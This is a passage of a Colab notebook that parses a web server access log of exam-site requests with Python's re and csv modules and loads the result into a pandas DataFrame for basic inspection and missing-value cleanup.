              " '103.44.12.218 - - [19/Mar/2021:15:11:20 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:20 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10366 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:20 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10384 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:20 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:20 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10368 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:20 +0000] \"POST /exam/162/check/1/6/16/16/ HTTP/1.1\" 200 10356 \"http://${BASE_URL_1}/exam/161/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:20 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:20 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10371 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:20 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10388 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:20 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/162/check/1/6/16/16/ HTTP/1.1\" 200 10356 \"http://${BASE_URL_1}/exam/161/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10396 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10392 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/171/check/1/6/16/16/ HTTP/1.1\" 200 10436 \"http://${BASE_URL_1}/exam/170/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/162/check/1/6/16/16/ HTTP/1.1\" 200 10359 \"http://${BASE_URL_1}/exam/161/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10372 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10368 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10373 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:21 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:22 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:22 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:22 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 200 10378 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:22 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10393 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:22 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10408 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:22 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 403 562 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:22 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:22 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10373 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:22 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10355 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:22 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 200 10352 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10370 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10384 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10388 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10364 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/174/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/173/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"GET /exam/login/?next=/exam/174/check/1/6/16/16/ HTTP/1.1\" 200 2402 \"http://${BASE_URL_1}/exam/173/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/171/check/1/6/16/16/ HTTP/1.1\" 200 10432 \"http://${BASE_URL_1}/exam/170/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10384 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10390 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10386 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:23 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:24 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10390 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:24 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10380 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:24 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:24 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10391 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:11:24 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10395 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " ...]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 16
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "c-NZY550fRQ3"
      },
      "source": [
        ""
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "92jVt_I1sWzz",
        "outputId": "fce1a3fb-7015-43b9-c2ac-253b5c0681e8"
      },
      "source": [
        "type(d)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "_io.TextIOWrapper"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 17
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "2Ib9i1Ryp90B",
        "outputId": "c94fde12-5f5c-4f92-cf08-916354119e4a"
      },
      "source": [
        "import re\n",
        "b=\"Codegnan is in vijayawada\"\n",
        "j=re.split('\\s',b)\n",
        "j"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['Codegnan', 'is', 'in', 'vijayawada']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 24
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "seNTM6KlyMUV"
      },
      "source": [
        "import re #regular expressions are sequence of characters that help to match or find string in another string\n",
        "import os\n",
        "import csv #classes to read and write tabular data in csv\n",
        "c=[]\n",
        "b=[\"ip\",\"timestamp\",\"timezone\",\"request\",\"slash\",\"http\",\"status\"]\n",
        "with open('logfile.txt')as f:\n",
        " lines=f.read().splitlines()\n",
        " for line in lines:\n",
        "   line=line.replace(\",\",\"\")\n",
        "   line=line.replace(\"[\",\"\")\n",
        "   line=line.replace(\"]\",\"\")\n",
        "   line=line.replace('\"','')\n",
        "   line=line.replace('-','')\n",
        "   a=re.split('\\s+',line)[:7]\n",
        "   c.append(a)\n",
        "\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "54Pg-gq6tGTI"
      },
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CxDOWyMy2q4q",
        "outputId": "31724291-f513-4957-a5f6-010777a53a55"
      },
      "source": [
        "len(c)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "5183"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 32
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "yal4GBEC24ma",
        "outputId": "c24eddae-4346-4971-8381-8f63f1f48df3"
      },
      "source": [
        "c[0]"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['103.44.12.218',\n",
              " '19/Mar/2021:14:27:44',\n",
              " '+0000',\n",
              " 'POST',\n",
              " '/exam/168/check/1/6/16/16/',\n",
              " 'HTTP/1.1',\n",
              " '200']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 33
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "o1VSvo-A_hSk"
      },
      "source": [
        "with open('logfile.csv','w')as f:\n",
        "  write=csv.writer(f)\n",
        "  write.writerow(b) \n",
        "  write.writerows(c)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6VzNuIWvCvD5",
        "outputId": "2a0a35a0-111d-4482-e8b9-cc9621ddc5a1"
      },
      "source": [
        "!pip install pandas"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Requirement already satisfied: pandas in /usr/local/lib/python3.7/dist-packages (1.1.5)\n",
            "Requirement already satisfied: python-dateutil>=2.7.3 in /usr/local/lib/python3.7/dist-packages (from pandas) (2.8.1)\n",
            "Requirement already satisfied: pytz>=2017.2 in /usr/local/lib/python3.7/dist-packages (from pandas) (2018.9)\n",
            "Requirement already satisfied: numpy>=1.15.4 in /usr/local/lib/python3.7/dist-packages (from pandas) (1.19.5)\n",
            "Requirement already satisfied: six>=1.5 in /usr/local/lib/python3.7/dist-packages (from python-dateutil>=2.7.3->pandas) (1.15.0)\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 417
        },
        "id": "BaHSq1B8EZJC",
        "outputId": "12b3dd4c-ffa1-4fac-f7d9-6d2fdcb88dc3"
      },
      "source": [
        "import pandas as pd\n",
        "data=pd.read_csv('logfile.csv')\n",
        "data"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>ip</th>\n",
              "      <th>timestamp</th>\n",
              "      <th>timezone</th>\n",
              "      <th>request</th>\n",
              "      <th>slash</th>\n",
              "      <th>http</th>\n",
              "      <th>status</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>103.44.12.218</td>\n",
              "      <td>19/Mar/2021:14:27:44</td>\n",
              "      <td>0</td>\n",
              "      <td>POST</td>\n",
              "      <td>/exam/168/check/1/6/16/16/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>200.0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>103.44.12.218</td>\n",
              "      <td>19/Mar/2021:14:27:44</td>\n",
              "      <td>0</td>\n",
              "      <td>GET</td>\n",
              "      <td>/exam/login/?next=/exam/167/check/1/6/16/16/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>200.0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>103.44.12.218</td>\n",
              "      <td>19/Mar/2021:14:27:44</td>\n",
              "      <td>0</td>\n",
              "      <td>POST</td>\n",
              "      <td>/exam/168/check/1/6/16/16/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>200.0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>103.44.12.218</td>\n",
              "      <td>19/Mar/2021:14:27:45</td>\n",
              "      <td>0</td>\n",
              "      <td>POST</td>\n",
              "      <td>/exam/168/check/1/6/16/16/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>200.0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>103.44.12.218</td>\n",
              "      <td>19/Mar/2021:14:27:45</td>\n",
              "      <td>0</td>\n",
              "      <td>POST</td>\n",
              "      <td>/exam/169/check/1/6/16/16/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>200.0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>...</th>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5178</th>\n",
              "      <td>103.44.12.218</td>\n",
              "      <td>19/Mar/2021:17:23:49</td>\n",
              "      <td>0</td>\n",
              "      <td>POST</td>\n",
              "      <td>/exam/login/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>302.0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5179</th>\n",
              "      <td>103.44.12.218</td>\n",
              "      <td>19/Mar/2021:17:23:49</td>\n",
              "      <td>0</td>\n",
              "      <td>GET</td>\n",
              "      <td>/exam/manage/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>200.0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5180</th>\n",
              "      <td>103.44.12.218</td>\n",
              "      <td>19/Mar/2021:17:23:49</td>\n",
              "      <td>0</td>\n",
              "      <td>GET</td>\n",
              "      <td>/static/css/moderator_dashboard.css</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>200.0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5181</th>\n",
              "      <td>103.44.12.218</td>\n",
              "      <td>19/Mar/2021:17:24:17</td>\n",
              "      <td>0</td>\n",
              "      <td>HEAD</td>\n",
              "      <td>/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>200.0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5182</th>\n",
              "      <td>103.44.12.218</td>\n",
              "      <td>19/Mar/2021:17:24:47</td>\n",
              "      <td>0</td>\n",
              "      <td>HEAD</td>\n",
              "      <td>/</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "      <td>200.0</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "<p>5183 rows × 7 columns</p>\n",
              "</div>"
            ],
            "text/plain": [
              "                 ip             timestamp  ...      http status\n",
              "0     103.44.12.218  19/Mar/2021:14:27:44  ...  HTTP/1.1  200.0\n",
              "1     103.44.12.218  19/Mar/2021:14:27:44  ...  HTTP/1.1  200.0\n",
              "2     103.44.12.218  19/Mar/2021:14:27:44  ...  HTTP/1.1  200.0\n",
              "3     103.44.12.218  19/Mar/2021:14:27:45  ...  HTTP/1.1  200.0\n",
              "4     103.44.12.218  19/Mar/2021:14:27:45  ...  HTTP/1.1  200.0\n",
              "...             ...                   ...  ...       ...    ...\n",
              "5178  103.44.12.218  19/Mar/2021:17:23:49  ...  HTTP/1.1  302.0\n",
              "5179  103.44.12.218  19/Mar/2021:17:23:49  ...  HTTP/1.1  200.0\n",
              "5180  103.44.12.218  19/Mar/2021:17:23:49  ...  HTTP/1.1  200.0\n",
              "5181  103.44.12.218  19/Mar/2021:17:24:17  ...  HTTP/1.1  200.0\n",
              "5182  103.44.12.218  19/Mar/2021:17:24:47  ...  HTTP/1.1  200.0\n",
              "\n",
              "[5183 rows x 7 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 37
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "mlXfeCZ6GCXQ",
        "outputId": "65b809b3-5619-401b-b248-deb47b41396f"
      },
      "source": [
        "type(data)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "pandas.core.frame.DataFrame"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 38
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "IZu5p5CGGlux",
        "outputId": "a65ee456-79a8-4a29-f708-03519441e0ea"
      },
      "source": [
        "data.columns"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Index(['ip', 'timestamp', 'timezone', 'request', 'slash', 'http', 'status'], dtype='object')"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 39
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_3H4vQNzGsAa",
        "outputId": "342b5253-505b-4d1e-b89d-b1e8f5008eac"
      },
      "source": [
        "#To get the information\n",
        "data.info()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "<class 'pandas.core.frame.DataFrame'>\n",
            "RangeIndex: 5183 entries, 0 to 5182\n",
            "Data columns (total 7 columns):\n",
            " #   Column     Non-Null Count  Dtype  \n",
            "---  ------     --------------  -----  \n",
            " 0   ip         5183 non-null   object \n",
            " 1   timestamp  5183 non-null   object \n",
            " 2   timezone   5183 non-null   int64  \n",
            " 3   request    5183 non-null   object \n",
            " 4   slash      5183 non-null   object \n",
            " 5   http       5174 non-null   object \n",
            " 6   status     5174 non-null   float64\n",
            "dtypes: float64(1), int64(1), object(5)\n",
            "memory usage: 283.6+ KB\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4_QcIPiyHjCD",
        "outputId": "c1998c25-a422-4580-d9c1-a517e3802671"
      },
      "source": [
        "#To get the count of missing values in dataframe\n",
        "data.isnull().sum()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "ip           0\n",
              "timestamp    0\n",
              "timezone     0\n",
              "request      0\n",
              "slash        0\n",
              "http         9\n",
              "status       9\n",
              "dtype: int64"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 42
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Fb_sAuFjIWTL",
        "outputId": "08e01331-2d24-4528-b754-0350120395b5"
      },
      "source": [
        "#To drop missing values\n",
        "data.dropna(inplace=True)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "5174"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 43
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "I-l1vVNvKU7K",
        "outputId": "59c9f795-f724-4ffa-dee8-bb958ce3a5f0"
      },
      "source": [
        "data.isnull().sum()\n",
        "len(data)"
      ],
